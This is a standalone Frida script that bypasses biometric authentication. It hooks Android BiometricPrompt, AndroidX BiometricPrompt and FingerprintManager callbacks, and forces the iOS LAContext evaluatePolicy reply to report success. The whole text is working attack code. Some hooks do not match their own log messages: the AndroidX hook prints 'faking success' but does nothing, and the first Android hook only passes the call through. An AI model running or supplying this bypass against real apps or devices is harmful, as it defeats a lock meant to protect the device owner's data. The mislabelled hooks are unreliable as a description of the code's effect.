// Biometric authentication bypass
Java.perform(function () {
    // Android BiometricPrompt.AuthenticationCallback
    try {
        var BiometricPrompt = Java.use("android.hardware.biometrics.BiometricPrompt");
        var AuthCallback = Java.use("android.hardware.biometrics.BiometricPrompt$AuthenticationCallback");
        AuthCallback.onAuthenticationSucceeded.implementation = function (result) {
            console.log("[biometric-bypass] BiometricPrompt success callback triggered");
            return this.onAuthenticationSucceeded(result);
        };
    } catch (e) {}

    // AndroidX BiometricPrompt
    try {
        var BiometricPromptCompat = Java.use("androidx.biometric.BiometricPrompt");
        var AuthCallbackCompat = Java.use("androidx.biometric.BiometricPrompt$AuthenticationCallback");
        AuthCallbackCompat.onAuthenticationError.implementation = function (code, msg) {
            console.log("[biometric-bypass] Intercepted auth error " + code + ": " + msg + " — faking success");
            var AuthResult = Java.use("androidx.biometric.BiometricPrompt$AuthenticationResult");
            // We can't easily construct AuthenticationResult without a CryptoObject,
            // so log the intercept and let the app proceed with its fallback.
        };
    } catch (e) {}

    // FingerprintManager (legacy)
    try {
        var FingerprintManager = Java.use("android.hardware.fingerprint.FingerprintManager");
        var FingerprintAuthCallback = Java.use("android.hardware.fingerprint.FingerprintManager$AuthenticationCallback");
        FingerprintAuthCallback.onAuthenticationFailed.implementation = function () {
            console.log("[biometric-bypass] FingerprintManager auth failed — faking success");
            var authResult = Java.use("android.hardware.fingerprint.FingerprintManager$AuthenticationResult").$new(null);
            this.onAuthenticationSucceeded(authResult);
        };
    } catch (e) {}

    console.log("[biometric-bypass] Biometric bypass hooks installed");
});

// iOS LAContext evaluatePolicy bypass
if (ObjC.available) {
    try {
        var LAContext = ObjC.classes.LAContext;
        if (LAContext) {
            var evaluatePolicy = LAContext["- evaluatePolicy:localizedReason:reply:"];
            Interceptor.attach(evaluatePolicy.implementation, {
                onEnter: function (args) {
                    // args[3] = reply block
                    var replyBlock = args[3];
                    var Block = ObjC.Block(replyBlock);
                    var origImpl = Block.implementation;
                    Block.implementation = function (success, error) {
                        console.log("[biometric-bypass] LAContext evaluatePolicy -> forcing success");
                        origImpl(1, null);
                    };
                },
            });
        }
        console.log("[biometric-bypass] iOS LAContext bypass hook installed");
    } catch (e) {
        console.log("[biometric-bypass] iOS hook skipped: " + e.message);
    }
}
